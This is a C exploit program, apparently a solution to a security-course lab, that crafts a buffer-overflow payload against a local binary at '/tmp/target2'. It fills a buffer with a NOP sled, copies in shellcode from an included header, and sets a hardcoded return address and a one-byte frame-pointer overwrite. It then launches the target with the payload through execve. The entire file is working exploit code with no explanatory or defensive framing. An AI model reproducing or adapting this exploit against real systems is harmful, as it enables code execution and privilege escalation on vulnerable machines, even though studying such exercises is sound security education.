#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"
#define NOP 0x90

char payload[202];

void make_payload(){
  int i = 0;
  for(i = 0; i < 202; i++)
    payload[i] = NOP;

  //Buf 256 bytes
  //EBP 4   bytes
  //Want to Send to Address: 0xbffffc74
  strncpy(payload + 100, shellcode, 45);

  //Fake EIP 
  payload[196] = 0xc8;
  payload[197] = 0xfc;
  payload[198] = 0xff;
  payload[199] = 0xbf;
  
  payload[200] = 0x88;

  payload[201] = 0x00;
}

int main(void) {
  char *args[] = { TARGET, payload, NULL };
  char *env[] = { NULL };

  make_payload();

  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}
